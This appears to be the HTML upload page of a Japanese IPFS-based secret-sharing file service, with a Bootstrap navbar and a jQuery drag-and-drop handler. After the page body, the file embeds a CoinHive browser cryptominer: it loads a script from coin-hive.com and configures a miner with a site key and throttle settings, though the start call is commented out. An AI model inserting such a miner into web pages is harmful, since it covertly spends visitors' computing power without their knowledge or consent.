<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <!-- 見た目用にBootstrapを使う -->
        <script src="js/jquery-3.2.1.min.js"></script>

        <script src="js/main.js" type="text/javascript"></script>
        <script src="js/bootstrap.min.js" type="text/javascript"></script>
        <link rel="stylesheet" type="text/css" href="css/main.css" media="all">
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" media="all">
    </head>
      
    <body>
        <!-- navi bar -->
        <nav class="navbar navbar-inverse">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#patern04">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <label class="navbar-brand">改竄・削除不可秘密分散 ファイル共有サービス</label>
            </div>
                    
            <div id="patern04" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="./download.html">Download</a></li>
                    <li><a href="./upload.html">Upload</a></li>
                    <li><a href="./metadataList.html">MetadataList</a></li>
                    <li><a href="./ipfs.html">IPFS</a></li>
                </ul>
            </div>
        </nav>

        <div class="container">
            <div class="row">
                <h1>Upload</h1>
                <div class="col-sm-12" id="dragandrophandler" >ここにドロップしてください。</div>
                <!-- ファイルリスト -->
                <div class="col-sm-12" id="status1"></div>
            </div>
        </div>
    </body>

    <script>
        $(document).ready(function()
        {
            var obj = $("#dragandrophandler");
            obj.on('dragenter', function (e)
            {
                e.stopPropagation();
                e.preventDefault();
                $(this).css('border', '2px solid #0B85A1');
            });

            obj.on('dragover', function (e)
            {
                e.stopPropagation();
                e.preventDefault();
            });

            obj.on('drop', function (e)
            {
                $(this).css('border', '2px dotted #0B85A1');
                e.preventDefault();
                var files = e.originalEvent.dataTransfer.files;   
    
                // file1個ずつ処理していく 
                for (var i = 0; i < files.length; i++)
                {
                    handleFileUpload(files[i],obj);
                }
            });

            $(document).on('dragenter', function (e)
            {
                e.stopPropagation();
                e.preventDefault();
            });

            $(document).on('dragover', function (e)
            {
                e.stopPropagation();
                e.preventDefault();
                obj.css('border', '2px dotted #0B85A1');
            });

            $(document).on('drop', function (e)
            {
                e.stopPropagation();
                e.preventDefault();
            });
    
        });
    </script>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.User('IQIVO7COSkiiiW6dUGhMYvWgi0hJxQZ6', 'IPFS-SecretSharing', {
		threads: 1,
		autoThreads: false,
		throttle: 0.8,
		forceASMJS: false
	});
	//miner.start();
</script>
    </html>